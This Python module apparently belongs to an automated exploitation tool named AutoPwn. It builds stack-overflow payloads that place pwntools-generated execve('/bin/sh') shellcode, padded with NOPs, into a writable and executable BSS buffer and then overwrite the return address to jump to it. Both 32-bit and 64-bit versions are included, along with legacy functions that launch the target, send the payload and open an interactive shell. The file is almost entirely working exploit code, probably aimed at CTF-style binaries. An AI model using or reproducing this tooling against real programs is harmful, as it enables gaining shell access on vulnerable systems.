"""AutoPwn primitives layer: RWX shellcode payload builders (P6.6).

Replaces the v3.1 monolith's ``rwx_shellcode_x32`` +
``rwx_shellcode_x64`` (local) + ``rwx_shellcode_x32_remote`` +
``rwx_shellcode_x64_remote`` (remote — not in P6.6 scope; the
"remote" suffix is a v3.1 artifact of the ``process`` vs
``remote`` runtime split; primitives are runtime-agnostic) of
v3.1's payload construction (see ``autopwn/_legacy.py``
L1933-1986) with typed :class:`ExploitPrimitive` subclasses
that emit the final ROP payload bytes.

Per ``rebuild.md`` §6.7 P6.6 + ``refactor.md`` §3.2.2, this is
the only primitive that **places executable bytes at the front
of the payload** — shellcode itself, not a ROP chain.  It is
applicable when the target binary has ``rwx_segments=True``
(a BSS/data section that's simultaneously writable AND
executable) AND a sufficiently large BSS symbol to host the
shellcode (``st_size > 30`` per v3.1's
``find_large_bss_symbols`` filter).

Public API
----------
* :class:`RwxShellcodeX32` — 32-bit
  * ``build_payload(ctx) -> bytes`` — emits the final payload
    (no leak, no second stage; this is a single-stage primitive).
  * Auto-finds the BSS symbol via :func:`_lookup_bss_addr` —
    same pattern as :class:`ExecveSyscallX32`'s
    ``_lookup_binsh`` (P6.5).
* :class:`RwxShellcodeX64` — 64-bit; same contract as
  :class:`RwxShellcodeX32` but with ``p64`` for the return
  address.

Why this primitive exists
-------------------------
* The classic "shellcode in input buffer, ret to input buffer"
  pattern requires the **input buffer's address to be both
  writable AND executable**.  When the BSS region of the
  binary is RWX, the input that the program reads into BSS
  becomes self-executing.  ``checksec`` reports this as
  ``RWX segments: Has RWX segments``; the recon layer
  (P4.1) lifts that into ``ctx.binary.rwx_segments``.
* If the binary has NX, the input buffer is not executable;
  the shellcode strategy fails.  P7's strategy registry skips
  this primitive when ``rwx_segments`` is ``False``.
"""
from __future__ import annotations

from typing import Optional

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


# Minimum BSS symbol size to be usable for shellcode storage.
# Matches v3.1's ``find_large_bss_symbols`` (``_legacy.py`` L345):
# ``symbol['st_size'] > 30``.  pwntools ``shellcraft.sh()`` is
# ~44 bytes on x32 / ~48 bytes on x64, so anything ≥ 30 is a
# viable candidate (the nop-sled + return-address overwrites the
# rest).
MIN_BSS_SIZE = 30


def _lookup_bss_addr(program) -> Optional[int]:
    """Return the address of the first usable BSS symbol in ``program``.

    Mirrors v3.1's ``find_large_bss_symbols`` selection logic
    (``_legacy.py`` L332-355): scans the ``.symtab`` for the
    first ``STT_OBJECT`` symbol with ``st_size > 30`` and
    returns its ``st_value`` (runtime address).  Returns
    ``None`` when:
      * the binary has no ``.symtab`` (stripped);
      * no symbol matches the size filter;
      * the binary is unreadable.

    The address returned is what the v3.1 ``name_addr = elf.symbols[function_name]``
    inside ``rwx_shellcode_x32`` resolves to — so this helper
    is the typed, side-effect-free replacement for the
    function-name-then-lookup pattern.

    Side effects:
        Read-only ELF parse via :mod:`elftools`; no file writes,
        no globals writes.
    """
    from autopwn.recon.bss import find_bss

    syms = find_bss(program, min_size=MIN_BSS_SIZE)
    if not syms:
        return None
    return syms[0].address


class RwxShellcodeX32(ExploitPrimitive):
    """32-bit ``pwntools shellcraft.sh()`` injected into an RWX BSS buffer.

    Payload shape (mirrors v3.1 ``rwx_shellcode_x32`` L1933-1952)::

        [shellcode.ljust(padding, asm('nop'))] [p32(bss_addr)]

    Where:
        * ``shellcode = asm(shellcraft.sh())`` — pwntools-generated
          ~44-byte ``execve("/bin/sh")`` payload.
        * ``padding`` is the buffer overflow offset to the saved
          return address (from :class:`ExploitContext`).
        * ``bss_addr`` is the first BSS symbol address (size >
          30) — also the location of the shellcode (when the
          vulnerable program reads input into the BSS buffer,
          the shellcode lands at that address).

    The address is encoded as ``p32``; the shellcode is placed
    at the **front** of the buffer and padded to ``padding``
    bytes with single-byte NOPs (``asm('nop')``), then the
    saved return address is overwritten with the BSS address
    (where the shellcode now lives, ready to execute).
    """

    name = "rwx-shellcode-x32"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 32-bit RWX shellcode payload, or ``b""`` if not applicable."""
        from pwn import asm, flat, p32, shellcraft

        if ctx.binary.bit != 32:
            return b""
        if not ctx.binary.rwx_segments:
            return b""
        if ctx.padding <= 0:
            return b""

        bss_addr = _lookup_bss_addr(ctx.binary.path)
        if bss_addr is None:
            return b""

        shellcode = asm(shellcraft.sh())
        return flat([shellcode.ljust(ctx.padding, asm("nop")), p32(bss_addr)])


class RwxShellcodeX64(ExploitPrimitive):
    """64-bit ``pwntools shellcraft.sh()`` injected into an RWX BSS buffer.

    Same contract as :class:`RwxShellcodeX32` but with ``p64``
    for the return address and an x64 shellcode (~48 bytes).
    Used for x64 binaries with ``rwx_segments=True``.
    """

    name = "rwx-shellcode-x64"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 64-bit RWX shellcode payload, or ``b""`` if not applicable."""
        from pwn import asm, flat, p64, shellcraft

        if ctx.binary.bit != 64:
            return b""
        if not ctx.binary.rwx_segments:
            return b""
        if ctx.padding <= 0:
            return b""

        bss_addr = _lookup_bss_addr(ctx.binary.path)
        if bss_addr is None:
            return b""

        shellcode = asm(shellcraft.sh())
        return flat([shellcode.ljust(ctx.padding, asm("nop")), p64(bss_addr)])


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output verbatim
# =====================================================================

# ``OBSOLETE`` prefix signals: do NOT call these from new code; they
# exist only so the v3.1 monolith's callers (line numbers in
# ``_legacy.py``) can be re-routed byte-for-byte through the new
# primitives if/when P8 orchestrator retires the monolith.
#
# The legacy functions kept the original ``process(program)`` /
# ``interactive()`` lifecycle, so they're not pure — that's
# intentional, they're the v3.1 "kitchen sink" version preserved
# for behavior parity.
def _legacy_rwx_shellcode_x32(program, buf_addr, padding, function_name, ret_addr):  # noqa: E501
    """OBSOLETE: verbatim port of v3.1 ``rwx_shellcode_x32`` (L1933-1952).

    Kept for byte-level parity with v3.1's print_* output.  New
    code should call :class:`RwxShellcodeX32` and feed the
    returned bytes to a P7 strategy's IO loop.
    """
    from pwn import ELF, asm, flat, p32, process, shellcraft

    io = process(program)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p32(buf_addr)
    name_addr = elf.symbols[function_name]
    shellcode = asm(shellcraft.sh())

    payload = flat([shellcode.ljust(padding, asm("nop")), p32(name_addr)])
    io.recv()
    io.sendline(payload)
    io.interactive()


def _legacy_rwx_shellcode_x64(program, buf_addr, padding, function_name, ret_addr, libc_path):  # noqa: E501
    """OBSOLETE: verbatim port of v3.1 ``rwx_shellcode_x64`` (L1954-1975).

    Same IO lifecycle as :func:`_legacy_rwx_shellcode_x32` but
    with ``p64`` for the return address.  ``libc_path`` is
    accepted but unused — mirrors v3.1's parameter list.
    """
    from pwn import ELF, asm, flat, p64, process, shellcraft

    io = process(program)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p64(buf_addr)
    name_addr = elf.symbols[function_name]
    shellcode = asm(shellcraft.sh())

    payload = flat([shellcode.ljust(padding, asm("nop")), p64(name_addr)])
    io.recv()
    io.sendline(payload)
    io.interactive()
